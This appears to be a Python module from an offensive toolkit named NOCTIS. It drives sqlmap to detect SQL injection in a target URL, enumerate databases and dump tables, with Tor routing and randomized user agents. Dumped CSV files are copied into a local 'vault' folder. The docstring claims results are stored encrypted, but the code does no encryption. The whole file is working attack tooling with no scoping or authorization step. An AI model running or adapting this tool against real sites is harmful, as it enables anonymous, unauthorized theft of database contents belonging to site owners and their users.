#!/usr/bin/env python3
"""
NOCTIS module — SQL injection exploitation (sqlmap driver).
Detects and optionally dumps data; results are parsed and stored encrypted.

  noctis sql <url>              detect only
  noctis sql <url> -d           list databases
  noctis sql <url> -D db -T tb --dump
  noctis sql <url> -l 3         level/risk 3 (slower, deeper)
"""
import os
import re
import shutil
import subprocess
import sys
import tempfile

sys.dont_write_bytecode = True

NAME = "sql"
ALIASES = ["sq"]
HELP = "SQL injection (sqlmap)"
PREFIX = "sql"

C = {"r": "\033[0m", "b": "\033[1m", "dim": "\033[2m", "red": "\033[31m",
     "grn": "\033[32m", "yel": "\033[33m", "cyn": "\033[36m", "mag": "\033[35m"}

def hdr(t):
    print(f"\n{C['mag']}{C['b']}┌─ {t} {'─' * max(0, 44 - len(t))}{C['r']}")

def add_args(p):
    p.add_argument("url")
    p.add_argument("-d", "--dbs", action="store_true", help="list databases")
    p.add_argument("-D", "--database", help="database")
    p.add_argument("-T", "--table", help="table")
    p.add_argument("--dump", action="store_true", help="dump data")
    p.add_argument("-l", "--level", type=int, default=1, help="test level 1-5")
    p.add_argument("--risk", type=int, default=1, help="risk level 1-3")
    p.add_argument("--tor", action="store_true", help="via Tor")

def execute(a):
    if not shutil.which("sqlmap"):
        print(f"{C['red']}sqlmap not installed{C['r']}")
        return None
    if not re.match(r"https?://", a.url):
        a.url = "https://" + a.url

    outdir = tempfile.mkdtemp(prefix="noctis-sqlmap-")
    cmd = ["sqlmap", "-u", a.url, "--batch", "--random-agent",
           "--output-dir", outdir,
           f"--level={a.level}", f"--risk={a.risk}",
           "--threads=2"]

    if a.tor:
        cmd += ["--tor", "--check-tor"]
    if a.dbs:
        cmd.append("--dbs")
    if a.database:
        cmd += ["-D", a.database]
    if a.table:
        cmd += ["-T", a.table]
    if a.dump:
        cmd.append("--dump")

    print(f"{C['b']}{C['red']}NOCTIS{C['r']} {C['dim']}// sql // {a.url}{C['r']}")
    print(f"{C['dim']}$ {' '.join(cmd[:4])} ...{C['r']}\n")

    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
    except subprocess.TimeoutExpired:
        shutil.rmtree(outdir, ignore_errors=True)
        print(f"{C['red']}sqlmap timeout (30m){C['r']}")
        return None

    text = (p.stdout or "") + "\n" + (p.stderr or "")
    injectable = bool(re.search(r"is vulnerable|injection point|Payload:", text, re.I))
    params = sorted(set(re.findall(r"Parameter: (\S+)", text)))
    dbms = re.search(r"back-end DBMS: (.+)", text)
    payloads = re.findall(r"Payload: (.+)", text)
    dbs = []
    if a.dbs:
        m = re.search(r"available databases \[\d+\]:(.*?)(?:\n\[|\Z)", text, re.S)
        if m:
            dbs = [x.strip("[*] ").strip() for x in m.group(1).splitlines() if x.strip()]

    hdr("RESULT")
    print(f"  {C['cyn']}injectable{C['r']}   "
          f"{C['grn'] + 'YES' + C['r'] if injectable else C['red'] + 'no' + C['r']}")
    if params:
        print(f"  {C['cyn']}parameters{C['r']}   {', '.join(params)}")
    if dbms:
        print(f"  {C['cyn']}dbms{C['r']}         {dbms.group(1).strip()}")
    for i, pl in enumerate(payloads[:3], 1):
        print(f"  {C['cyn']}payload {i}{C['r']}    {C['dim']}{pl[:110]}{C['r']}")
    if dbs:
        hdr(f"DATABASES ({len(dbs)})")
        for d in dbs[:25]:
            print(f"  {C['grn']}{d}{C['r']}")

    dump_files = []
    for root, _, files in os.walk(outdir):
        for f in files:
            if f.endswith(".csv"):
                dump_files.append(os.path.join(root, f))
    if dump_files:
        hdr("DUMPED FILES")
        for f in dump_files[:10]:
            size = os.path.getsize(f)
            print(f"  {C['grn']}{f}{C['r']} {C['dim']}({size}b){C['r']}")
        keep = os.path.join(os.path.expanduser("~"), "noctis", "vault", "_sqlmap")
        os.makedirs(keep, exist_ok=True)
        for f in dump_files:
            try:
                shutil.copy2(f, os.path.join(keep, os.path.basename(f)))
            except Exception:
                pass
        print(f"  {C['dim']}copied to {keep}{C['r']}")

    shutil.rmtree(outdir, ignore_errors=True)

    return {"url": a.url, "injectable": injectable, "parameters": params,
            "dbms": dbms.group(1).strip() if dbms else "",
            "payloads": payloads[:5], "databases": dbs,
            "dumps": [os.path.basename(x) for x in dump_files]}

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    add_args(ap)
    execute(ap.parse_args())
